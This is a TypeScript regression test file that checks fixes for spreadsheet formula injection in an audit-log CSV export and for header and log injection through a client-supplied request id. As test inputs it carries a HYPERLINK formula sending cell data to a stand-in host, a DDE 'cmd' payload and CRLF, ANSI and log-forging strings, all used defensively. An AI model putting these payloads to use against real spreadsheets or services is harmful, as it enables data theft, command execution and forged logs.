/**
 * Untrusted text reaching a downstream interpreter.
 *
 * Two seams, one class of defect: a value the product accepted as data is
 * handed to something that reads it as a *program*.
 *
 *   - F-741: `auditRowsToCsv` quoted `"`/`,`/newline (correct CSV) but not a
 *     leading `=`, `+`, `-`, `@`, TAB or CR. Excel, LibreOffice and Sheets read
 *     those cells as formulas, so a project named `=HYPERLINK(...)` executes in
 *     the audit log of the most privileged person in the workspace.
 *   - F-758: `readRequestId` trusted any inbound `x-request-id` up to 64 chars,
 *     including newlines and ANSI escapes. That id becomes a response header, a
 *     field in every structured log line, a Sentry tag and `AuditLog.requestId`.
 *
 * Both blocks below failed against the pre-fix code.
 */
import { describe, expect, it } from 'vitest';
import { auditRowsToCsv, type AuditListRow } from '@/lib/audit/admin';
import { readRequestId } from '@/lib/request-id';

function row(overrides: Partial<AuditListRow>): AuditListRow {
  return {
    id: 'aud_1',
    workspaceId: 'default',
    actorId: 'u-1',
    actorEmail: 'admin@navroop.invalid',
    action: 'project.create',
    targetType: 'project',
    targetId: 'p-1',
    before: null,
    after: null,
    requestId: 'req_1',
    createdAt: new Date('2026-08-20T10:00:00.000Z'),
    diff: [],
    ...overrides,
  };
}

function cells(csv: string) {
  // Every field in these rows is emitted on one line, so splitting on the
  // record separator and then on commas is enough for the assertions below.
  const [, dataLine = ''] = csv.split('\n');
  return dataLine;
}

describe('audit CSV export escapes spreadsheet formulas (F-741)', () => {
  for (const dangerous of ['=', '+', '-', '@', '\t', '\r']) {
    it(`neutralises a cell starting with ${JSON.stringify(dangerous)}`, () => {
      const payload = `${dangerous}HYPERLINK("http://evil.invalid/"&A1,"ok")`;
      const csv = auditRowsToCsv([row({ actorEmail: payload })]);
      const line = cells(csv);
      // The cell must not begin (after any CSV quoting) with the trigger
      // character: that is the only thing a spreadsheet keys the formula on.
      const field = line.split(',')[1] ?? line;
      const unquoted = field.startsWith('"') ? field.slice(1) : field;
      expect(unquoted.startsWith(dangerous)).toBe(false);
      // The value itself is still there — this is escaping, not dropping.
      expect(csv).toContain('HYPERLINK');
    });
  }

  it('escapes the diff column, which carries arbitrary changed values', () => {
    const csv = auditRowsToCsv([row({ diff: ["name: =cmd|' /C calc'!A0"] })]);
    expect(csv).not.toMatch(/,=cmd/);
    expect(csv).not.toMatch(/,"=cmd/);
    expect(csv).toContain('cmd|');
  });

  it('leaves an ordinary cell byte-identical', () => {
    const csv = auditRowsToCsv([row({ actorEmail: 'admin@navroop.invalid' })]);
    // A leading `@` is dangerous; an `@` inside an address is not, and an
    // export that mangled every email would be its own defect.
    expect(csv).toContain('admin@navroop.invalid');
  });

  it('still quotes a cell containing a comma, quote or newline', () => {
    const csv = auditRowsToCsv([row({ targetId: 'a,b"c\nd' })]);
    expect(csv).toContain('"a,b""c\nd"');
  });
});

describe('readRequestId refuses a malformed client correlation id (F-758)', () => {
  const headers = (value: string | null) => ({
    get: (name: string) => (name === 'x-request-id' && value !== null ? value : null),
  });

  it('accepts a conservative id verbatim', () => {
    expect(readRequestId(headers('abc123DEF_-x'))).toBe('abc123DEF_-x');
  });

  for (const hostile of [
    'ok\nlevel=error event=fake',
    'ok\r\nX-Injected: 1',
    'ok\u001b[31mred',
    'ok id with spaces',
    'ok;drop',
    'a'.repeat(65),
    'short',
    '',
  ]) {
    it(`mints a fresh id for ${JSON.stringify(hostile)}`, () => {
      const id = readRequestId(headers(hostile));
      expect(id).not.toBe(hostile);
      expect(id).toMatch(/^[A-Za-z0-9_-]{8,64}$/);
    });
  }

  it('mints an id when the header is absent', () => {
    expect(readRequestId(headers(null))).toMatch(/^[A-Za-z0-9_-]{8,64}$/);
  });

  it('the minted id itself satisfies the pattern it enforces', () => {
    // Otherwise the guard would reject ids this process generated on the way
    // back in, and a propagated id would change identity per hop.
    const minted = readRequestId(headers(null));
    expect(readRequestId(headers(minted))).toBe(minted);
  });
});
